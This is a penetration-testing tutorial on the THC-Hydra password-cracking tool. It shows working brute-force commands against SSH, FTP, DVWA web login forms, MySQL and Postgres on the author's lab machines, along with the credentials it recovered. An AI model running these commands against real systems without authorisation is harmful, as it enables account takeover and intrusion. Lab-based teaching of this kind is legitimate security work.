# Hydra Brute Force Attack



## What is a Brute Force Attack?
A brute force attack is a hacking method where an attacker tries every possible combination of passwords until the correct one is found.



## What is Hydra?
Hydra (or THC-Hydra) is one of the most popular password-cracking tools used in penetration testing.

### Supported Services:
 - SSH
 - FTP
 - Telnet
 - HTTP (web logins)
 - SMB
 - RDP
 - MySQL
 - And many more



## How Does Hydra Work?
Hydra works by:
- Connecting to a service (like SSH or a login page)
- Trying each username/password from a list
- Checking if the login succeeds
- Reporting the correct credentials when found




# Hydra Methodology


##  Installation & Setup

### Installation in Linux
````
sudo apt install hydra
````
<img width="658" height="174" alt="image" src="https://github.com/user-attachments/assets/f7ace456-9adb-45cf-98b4-c82e2dae2f6d" />


- Or Compile from Source
````
git clone https://github.com/vanhauser-thc/thc-hydra
cd thc-hydra
./configure
make
sudo make install
````
- But in this i don't show demo how to install.


### Verification & Help

#### Check version
````
hydra -version
````
<img width="1892" height="164" alt="image" src="https://github.com/user-attachments/assets/f907a1c4-2a78-4587-b0bb-e03386414ff4" />

#### Check Installation
````
hydra -h
````
<img width="1895" height="868" alt="image" src="https://github.com/user-attachments/assets/2a708a20-0201-4079-80f9-42978ab31f07" />




**Note In This i used attacker In my local Windows and Kali Linux **
---


## Hydra Options Usage:
| Option                          | Meaning                                                                                                                               |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| `-R`                            | Restore a previous aborted/crashed session.                                                                                           |
| `-I`                            | Ignore an existing restore file (don’t wait 10 seconds).                                                                              |
| `-S`                            | Use SSL/TLS to connect to the service.                                                                                                |
| `-s PORT`                       | Specify a non-default port for the target service.                                                                                    |
| `-l LOGIN`                      | Single login/username to try.                                                                                                         |
| `-L FILE`                       | File with multiple logins/usernames (one per line).                                                                                   |
| `-p PASS`                       | Single password to try.                                                                                                               |
| `-P FILE`                       | File with multiple passwords (wordlist).                                                                                              |
| `-x MIN:MAX:CHARSET`            | Enable brute-force generation: min/max length and character set. (See `-x -h` for charset help.)                                      |
| `-y`                            | Disable symbols when using `-x` brute-force.                                                                                          |
| `-r`                            | Use non-random shuffling for generated passwords (`-x`).                                                                              |
| `-e nsr`                        | Extra tries: `n` = null password, `s` = login as password, `r` = reversed login.                                                      |
| `-u`                            | Loop around users instead of passwords (effective; implied with `-x`).                                                                |
| `-C FILE`                       | Use file with `login:pass` pairs (colon-separated) instead of `-L/-P`.                                                                |
| `-M FILE`                       | File with a list of servers/targets (one per line). Use `host:port` to specify port.                                                  |
| `-D XofY`                       | Divide wordlist into `Y` segments and use the `X`th segment (for distributed cracking).                                               |
| `-o FILE`                       | Write found login/password pairs to `FILE` (instead of stdout).                                                                       |
| `-b FORMAT`                     | Specify output format for `-o`: `text` (default), `json`, `jsonv1`.                                                                   |
| `-f`                            | Exit when a login/password pair is found (per-target when used with `-M`).                                                            |
| `-F`                            | Exit globally when a login/password pair is found (stop all targets).                                                                 |
| `-t TASKS`                      | Number of parallel connects per target (default `16`).                                                                                |
| `-T TASKS`                      | Number of parallel connects overall (for multi-target `-M`, default `64`).                                                            |
| `-w TIME`                       | Wait time (seconds) for a response (default `32`).                                                                                    |
| `-W TIME`                       | Wait time (seconds) between connections per thread (default `0`).                                                                     |
| `-c TIME`                       | Wait time per login attempt across all threads (forces `-t 1` behavior).                                                              |
| `-4`                            | Force use of IPv4 addresses.                                                                                                          |
| `-6`                            | Force use of IPv6 addresses (use `[]` for IPv6 in `-M`).                                                                              |
| `-v`                            | Verbose mode (more output).                                                                                                           |
| `-V`                            | Very verbose — show login and password for each attempt.                                                                              |
| `-d`                            | Debug mode (detailed debugging output).                                                                                               |
| `-O`                            | Use old SSL versions (SSL v2 and v3).                                                                                                 |
| `-K`                            | Don’t retry failed attempts (useful for mass scans with `-M`).                                                                        |
| `-q`                            | Quiet — do not print messages about connection errors.                                                                                |
| `-U`                            | Show usage/help for a specific service module (module-specific options).                                                              |
| `-m OPT`                        | Pass an option (`OPT`) specific to the chosen module (see `-U` for details).                                                          |
| `-h`                            | Show extended/complete help (additional command-line options).                                                                        |
| `service://server[:PORT][/OPT]` | Target specification: service (protocol) and server (IP/DNS). Examples: `ftp://10.0.0.1`, `http-get://host:8080/` (module-dependent). |
| `server`                        | Target host — a DNS name, IP, or a network like `192.168.0.0/24` (or use `-M`).                                                       |
| `service`                       | Protocol/module to attack (see Hydra supported protocols list).                                                                       |
| `OPT`                           | Module-specific options (check module help with `-U`).                                                                                |

---



## Basic Commands & Syntax

### Core Syntax Structure
````
hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr]
      [-u] [-f] [-F] [-M FILE] [-o FILE] [-t TASKS] [-w TIME] [-W TIME] 
      [-s PORT] [-S] [-x MIN:MAX:CHARSET] [-c TIME] [-4|-6] [-vV] 
      server service [OPT]
````





## Hydra Protocol Attack

### SSH Attacks
- In this i used with my lab: 192.168.127.136
<img width="894" height="499" alt="image" src="https://github.com/user-attachments/assets/b5e1b5d0-ca59-4710-8eaa-1e73e055f8b0" />

- Also in this first i need to scan my target they really open port `SSH` or not:
````
nmap 192.168.127.136 -sV -T4
````
<img width="1177" height="430" alt="image" src="https://github.com/user-attachments/assets/c079a45e-4196-4e14-9a9b-1b82ba5e96a8" />


- Wordlists:
````
/usr/share/wordlists/rockyou.txt
````
If in we don't have worlists:
````
/usr/share/wordlists/rockyou.txt
````
<img width="1157" height="115" alt="image" src="https://github.com/user-attachments/assets/11aca4ed-f70c-4f49-80a5-e12d22fb4deb" />

- So this my wordlist:
<img width="649" height="186" alt="image" src="https://github.com/user-attachments/assets/cacc58bb-4796-44f1-98ff-653bb079ff06" />


#### Basic SSH
````
hydra -l sehe -P /usr/share/wordlists/passwd.txt 192.168.127.136 ssh -V
````
<img width="1897" height="833" alt="image" src="https://github.com/user-attachments/assets/a2833ef3-bb75-408b-9a2b-700a41d57f31" />

- So in this i found the correct `Password` foe `sehe`. Also in this we can login:
````
ssh sehe@192.168.127.136
````
<img width="1096" height="478" alt="image" src="https://github.com/user-attachments/assets/d199284a-e1b8-4b76-a3a3-f2f4eaeaf30b" />

````
Username: sehe
Password: SecureP@ssHere!
````


````
hydra -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/passwd.txt ssh://192.168.127.136 -t 4 -V
````
<img width="1317" height="933" alt="image" src="https://github.com/user-attachments/assets/5e54c0a6-f4ed-4ef1-bc8a-d9c76619c8c9" />

<img width="1192" height="996" alt="image" src="https://github.com/user-attachments/assets/20e02bcf-51ce-46f3-ac9c-3d5904c01e21" />

- `-t 4`: Use 4 parallel threads (faster but not too aggressive)


````
hydra -l sehe -P /usr/share/wordlists/passwd.txt ssh://192.168.127.136 -t 4 -vV -f -o ssh-brute.txt
````
<img width="1266" height="920" alt="image" src="https://github.com/user-attachments/assets/99e22b09-c643-4853-a41a-a89389260f03" />

- Check our file:
````
cat ssh-brute.txt
````
<img width="1888" height="129" alt="image" src="https://github.com/user-attachments/assets/6dc727e9-2aa1-4d6f-b7de-b11f86aebfa3" />


#### SSH with additional checks
````
hydra -l sehe -P /usr/share/wordlists/passwd.txt -e nsr -u ssh://192.168.127.136
````
<img width="1320" height="967" alt="image" src="https://github.com/user-attachments/assets/f2bee2ba-363f-402b-8baf-2dbe97136ca6" />


---



### FTP Attacks
- And in this we test with metasploitable 2: 192.168.127.129
````
nmap -sV -T4 192.168.127.129
````
<img width="1248" height="670" alt="image" src="https://github.com/user-attachments/assets/ee8f4164-c74f-4ddf-9557-210e3c3494a3" />


#### Basic FTP
````
hydra -l msfadmin -P /usr/share/wordlists/passwd.txt ftp://192.168.127.129 -V
````
<img width="1442" height="640" alt="image" src="https://github.com/user-attachments/assets/d58e79ea-4138-4f68-87ef-fd3d282c5e36" />

- This we can login:
<img width="994" height="446" alt="image" src="https://github.com/user-attachments/assets/ad4cdc91-8a7f-4585-95b3-11bab25493e1" />

````
Username: msfadmin
Password: msfadmin
````

####  FTP with verbose output
````
hydra -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/passwd.txt ftp://192.168.127.129 -vV
````
<img width="1439" height="992" alt="image" src="https://github.com/user-attachments/assets/f112965d-1514-47b0-a6b1-67fe1d667284" />

<img width="1391" height="996" alt="image" src="https://github.com/user-attachments/assets/70f5894d-647e-4af3-ac49-f05c6c87c1c9" />

---


### HTTP/HTTPS Attacks


- In this my target is DVWA: 
<img width="734" height="635" alt="image" src="https://github.com/user-attachments/assets/8e6de545-2ce1-46ac-bc59-0770d3a528a3" />

#### Basic HTTP Auth
- First in this we need to input password before:
<img width="1877" height="822" alt="image" src="https://github.com/user-attachments/assets/a37f3880-4255-46be-87a2-01de932de05e" />


````
hydra -l admin -P /usr/share/wordlists/passwd.txt 192.168.127.129 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -V
````
<img width="1896" height="655" alt="image" src="https://github.com/user-attachments/assets/1b31b62c-0073-42e6-a832-84ddfcfb20bc" />

- In this we login `Success`:
<img width="681" height="603" alt="image" src="https://github.com/user-attachments/assets/bc1bfdb2-9424-47f5-97df-7dd3fa53025c" />



````
hydra -l admin -P /usr/share/wordlists/passwd.txt 192.168.127.129 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -vV -t 4
````
<img width="1908" height="505" alt="image" src="https://github.com/user-attachments/assets/04684769-e90a-4bda-b804-a2ee5a8ea941" />



### HTTP with Session Cookie:
- First in this we need to check our target `cookie` -> First go to our target and Press `F12`:
<img width="1858" height="622" alt="image" src="https://github.com/user-attachments/assets/1e7c5fe1-98c4-42f2-90c2-34d0d4156f33" />

<img width="1858" height="790" alt="image" src="https://github.com/user-attachments/assets/f1ba910e-c5f9-4e7f-882d-859103ce1b2d" />

- Show in this i found the `Session Cookie`:  ci0605n8ouikr0rnrmlapednl7
````
hydra -l admin -P /usr/share/wordlists/passwd.txt 'http-get-form://192.168.100.97:8080/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: se
curity=low; PHPSESSID=ci0605n8ouikr0rnrmlapednl7:F=Username and/or password incorrect' -V
````
<img width="1903" height="643" alt="image" src="https://github.com/user-attachments/assets/c0723719-3591-4f43-990f-4f10e459fd6f" />

- Show in this we found the correct password. Login to target:
<img width="976" height="777" alt="image" src="https://github.com/user-attachments/assets/20b0934a-b351-42da-adee-657326f9b582" />

<img width="979" height="775" alt="image" src="https://github.com/user-attachments/assets/8be87de6-7cd8-4082-b8b2-676e14bf8dbe" />

- So in this login success to our target.

**Note**: IF we want to brute force **HTTPS** just change from **http-get-form** to **https-get-form**.
---



## Database Attacks

### Brute Force Mysql server
````
hydra -l root -P /usr/share/wordlists/passwd.txt -vv -s 3306 192.168.127.129 mysql -e nsr
````
<img width="1070" height="316" alt="image" src="https://github.com/user-attachments/assets/1877cd48-902e-4c54-9799-d4859c8ba8cb" />


### Brute force Postgres
````
hydra -l postgres -P /usr/share/wordlists/passwd.txt -s 5432 -vV 192.168.127.129 postgres
````
<img width="1528" height="968" alt="image" src="https://github.com/user-attachments/assets/7b624aca-f791-4434-bbf6-b7636870d0ba" />

<img width="1552" height="797" alt="image" src="https://github.com/user-attachments/assets/2471bc27-deb4-441f-9854-ca4101721d95" />

- This password we can login success:
````
psql -h 192.168.127.129 -U postgres
````
<img width="839" height="419" alt="image" src="https://github.com/user-attachments/assets/30e5136e-6eaf-4993-b246-69b8bdd119c1" />

- Passowrd: `postgres`.



---


## End of Hydra


---


---

## Credit: Nin Kanong (k4n0ng)

---
